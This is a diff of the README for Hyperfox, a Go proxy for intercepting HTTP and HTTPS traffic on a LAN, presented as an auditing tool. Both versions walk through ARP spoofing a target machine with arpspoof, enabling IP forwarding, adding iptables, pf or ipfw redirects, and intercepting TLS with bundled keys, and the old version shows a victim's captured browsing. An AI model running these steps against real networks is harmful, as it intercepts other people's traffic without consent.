@@ -1,184 +1,99 @@
 # Hyperfox
 
-Hyperfox is a security tool for Man In The Middle operations over HTTP and
-HTTPs.
+[Hyperfox][1] is a tool for proxying and recording HTTP and HTTPs
+communications on a LAN.
 
-Hyperfox can be used as a tool for auditing a wide range of applications,
-including mobile applications that do not properly verify certificates or that
-do not use certificates at all.
-
-The `hyperfox` tool is a default distribution of the Hyperfox proxy.
-
-Hyperfox can also be used as a library to develop special proxies with [Go][1],
-if you're interested on programming a special proxy for any special MITM
-operation you may read the library documentation at [godoc.org][6].
-
-## Features of the Hyperfox tool
-
-The Hyperfox tool has some useful features:
-
-* Saves all the traffic between client and server.
-* Can modify server responses before arriving to the client.
-* Can modify client requests before sending them to the destination server.
-* Supports SSL/TLS.
-* Supports streaming.
+The `github.com/xiam/hyperfox` package is a [Go][2] framework for creating
+custom [man in the middle][3] or traffic interception tools, such as
+[Hyperfox][1].
 
 ## Getting Hyperfox
 
-You can download a pre-compiled binary of the Hyperfox tool:
-
-* [Linux x86_64](https://menteslibres.net/files/hyperfox/hyperfox-1.0-linux-x64)
-* [OSX x86_64](https://menteslibres.net/files/hyperfox/hyperfox-1.0-darwin-x64)
-
-Once you've downloaded the appropriate binary move it to `$HOME/bin/hyperfox`
-and call it using the full path:
+Install with [Go][1] and [git][5] using `go get`:
 
 ```sh
-$ ~/bin/hyperfox -h
+> go get github.com/xiam/hyperfox
 ```
 
-If you have `$HOME/bin` in your `$PATH`, you may as well call `hyperfox`
-without the full path:
+Precompiled packages may also be available at the [hyperfox.org][1] site.
 
-```sh
-$ hyperfox -h
+## A common example: hyperfox with arpspoof
+
+The following example assumes that hyperfox is installed on a Linux box (host)
+on which you have root access or sudo privileges and that the target machine is
+connected on the same LAN as the host.
+
+We are going to use the `arpspoof` tool that is part of the [dsniff][4] suite
+to alter the ARP table of the target machine in order to make it redirect its
+traffic to Hyperfox instead of to the legitimate LAN gateway. This is an
+ancient technique known as [ARP spoofing][6].
+
+First, identify both the local IP of the legitimate gateway and the matching
+network interface.
+
 ```
-
-If you have [Go][1] and [git][2] you can use `go get` to download the source
-and compile the Hyperfox tool by yourself:
-
-```sh
-$ go get github.com/xiam/hyperfox
-$ hyperfox -h
-```
-
-## Usage example
-
-**I**. Make sure the [dsniff][5] tool is installed in the MITM machine, we are
-going to use the `arpspoof` tool (part of [dsniff][5]) to alter the ARP table
-of a specific machine on LAN to make it redirect its traffic to us instead of
-to the legitimate LAN gateway. This ancient technique is known as
-[ARP spoofing][4].
-
-**II**. Identify the LAN IP of the machine you want to intercept traffic for.
-Let's suppose you want to intercept traffic from `10.0.0.146`.
-
-**III**. Identify the IP of your router and the name of the interface you're
-connected with, let's say your router is `10.0.0.1` and you're connected to
-the router through `wlan0`.
-
-```sh
-$ sudo route
+> sudo route
 Kernel IP routing table
 Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
-default         10.0.0.1        0.0.0.0         UG    0      0        0 wlan0
-```
-
-**IV**. Put the MITM machine in [IP forwarding][3] mode.
-
-```sh
-# Linux
-$ sudo sysctl -w net.ipv4.ip_forward=1
-
-# FreeBSD/OSX
-$ sudo sysctl -w net.inet.ip.forwarding=1
-```
-
-**V**. Run hyperfox (as a normal, unprivileged user) within a writable directory:
-
-```sh
-$ mkdir -p ~/tmp/hyperfox-session
-$ cd ~/tmp/hyperfox-session
-$ hyperfox -l 127.0.0.1:9999
-2013/08/25 08:21:36 Hyperfox tool, by Carlos Reventlov.
-2013/08/25 08:21:36 http://www.reventlov.com
-
-2013/08/25 08:21:36 Listening for HTTP client requests at 127.0.0.1:9999.
-```
-
-If you want to analyze HTTPs instead of HTTP, use the `-s` flag and provide
-appropriate
-[cert.pem](https://github.com/xiam/hyperfox/raw/master/ssl/cert.pem) and
-[key.pem](https://github.com/xiam/hyperfox/raw/master/ssl/key.pem) files.
-
-```sh
-$ hyperfox -s -c ssl/cert.pem -k ssl/key.pem -l 127.0.0.1:9999
-```
-
-**VI**. Prepare the machine to forward everything but the port hyperfox will
-intercept (`80` for plain HTTP, `443` for HTTPs), instead tell it to forward
-the traffic on port `80` to the `9999` port on `127.0.0.1` (where `hyperfox`
-is listening).
-
-```sh
-# Linux
-$ sudo iptables -A PREROUTING -t nat -i wlan0 -p tcp --destination-port 80 -j REDIRECT --to-port 9999
-
-# OSX
-$ echo "rdr pass on en0 proto tcp from any to any port 80 -> 127.0.0.1 port 9999" › pf.conf
-$ sudo pfctl -d
-$ sudo pfctl -e -f pf.conf
-
-# FreeBSD
-$ sudo ipfw add fwd 127.0.0.1,9999 tcp from not me to any 80 via wlan0
-```
-
-**VII**. Run `arpspoof` to make `10.0.0.146` think our host is `10.0.0.1` (the
-LAN's legitimate gateway), once the ARP spoofing is completed, `10.0.0.146` will
-start to send its traffic through our machine.
-
-```sh
-$ sudo arpspoof -i wlan0 -t 10.0.0.146 10.0.0.1
-```
-
-**VIII**. !???
-
-**IX**. Profit!!
-
-Once `10.0.0.146` starts to send some traffic, a `capture` directory will
-be created, this directory contains client requests, server responses and
-headers.
-
-```sh
-$ cd ~/tmp/hyperfox-session
-$ ls
-capture
-$ cd capture
-$ find .
-./client
-./client/10.0.0.146
-./client/10.0.0.146/a.adcloud.net
-./client/10.0.0.146/a.adcloud.net/adcloud
-./client/10.0.0.146/a.adcloud.net/adcloud/12345
-./client/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699.head
-./client/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699
-...
-./server
-./server/10.0.0.146
-./server/10.0.0.146/a.adcloud.net
-./server/10.0.0.146/a.adcloud.net/adcloud
-./server/10.0.0.146/a.adcloud.net/adcloud/12345
-./server/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699.head
-./server/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699
-./server/10.0.0.146/a.adcloud.net/adcloud/12345/GET-20130825-133421-734021699.body
+default         10.0.0.1        0.0.0.0         UG    1024   0        0 wlan0
 ...
 ```
 
-You can see whatever is happening by watching hyperfox's output:
+The interface in our example is called `wlan0` and the gateway for that
+interface is `10.0.0.1`.
+
+```
+> export HYPERFOX_GW=10.0.0.1
+> export HYPERFOX_IFACE=wlan0
+```
+
+Then identify the IP address of the target, let's suppose it is `10.0.0.143`.
+
+```
+> export HYPERFOX_TARGET=10.0.0.143
+```
+
+Enable IP forwarding on the host for it to act (temporarily) as a common
+router.
+
+```
+> sudo sysctl -w net.ipv4.ip_forward=1
+```
+
+Issue an `iptables` rule to instruct the host to redirect all traffic that goes
+to port 80 (commonly HTTP) to a local port where Hyperfox is listening to
+(9999).
+
+```
+sudo iptables -A PREROUTING -t nat -i $HYPERFOX_IFACE -p tcp --destination-port 80 -j REDIRECT --to-port 9999
+```
+
+We're almost ready, prepare hyperfox to receive traffic:
+
+```
+> hyperfox
+2014/12/30 06:57:22 Hyperfox // https://www.hyperfox.org
+2014/12/30 06:57:22 By José Carlos Nieto.
+
+2014/12/30 06:57:22 See status at http://127.0.0.1:3030/
+2014/12/30 06:57:22 Listening for HTTP client requests on 0.0.0.0:9999.
+```
+
+Finally, run `arpspoof` to alter the target's ARP table so it starts sending
+its network traffic to the host box.
 
 ```sh
--> 10.0.0.146:61716 m.vanityfair.com: GET /business/features/2011/05/paul-allen-201105 HTTP/1.1 0b
-<- 10.0.0.146:61716 m.vanityfair.com: GET /business/features/2011/05/paul-allen-201105 HTTP/1.1 -1b 200
--> 10.0.0.146:61716 m.vanityfair.com: GET /static/css/mobify.css?1335486443 HTTP/1.1 0b
--> 10.0.0.146:61717 m.vanityfair.com: GET /static/mcss/561/stag-carmot-vf.css?1370835026 HTTP/1.1 0b
--> 10.0.0.146:61718 www.vanityfair.com: GET /etc/clientlibs/foundation/jquery.js HTTP/1.1 0b
--> 10.0.0.146:61719 dl.dropbox.com: GET /u/123456/vf-mobile/js/cn.mobifycore.js HTTP/1.1 0b
-<- 10.0.0.146:61718 www.vanityfair.com: GET /etc/clientlibs/foundation/jquery.js HTTP/1.1 0b 304
+> sudo arpspoof -i $HYPERFOX_IFACE -t $HYPERFOX_TARGET $HYPERFOX_GW
 ```
+
+## Contributing to Hyperfox development
+
+Sure, there's a lot of opportunity. Choose an [issue][7], fix it and send a
+pull request.
 
 ## License
 
-> Copyright (c) 2012-2013 José Carlos Nieto, https://menteslibres.net/xiam
+> Copyright (c) 2012-2014 José Carlos Nieto, https://menteslibres.net/xiam
 >
 > Permission is hereby granted, free of charge, to any person obtaining
 > a copy of this software and associated documentation files (the
@@ -199,9 +114,10 @@ You can see whatever is happening by watching hyperfox's output:
 > OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION
 > WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 
-[1]: http://golang.org/doc/install
-[2]: http://git-scm.com
-[3]: http://en.wikipedia.org/wiki/IP_forwarding
-[4]: http://en.wikipedia.org/wiki/ARP_spoofing
-[5]: http://monkey.org/~dugsong/dsniff/
-[6]: http://godoc.org/github.com/xiam/hyperfox/proxy
+[1]: https://hyperfox.org
+[2]: https://golang.org/doc/install
+[3]: http://en.wikipedia.org/wiki/Man-in-the-middle_attack
+[4]: http://monkey.org/~dugsong/dsniff/
+[5]: http://git-scm.com
+[6]: http://en.wikipedia.org/wiki/ARP_spoofing
+[7]: https://github.com/xiam/hyperfox/issues
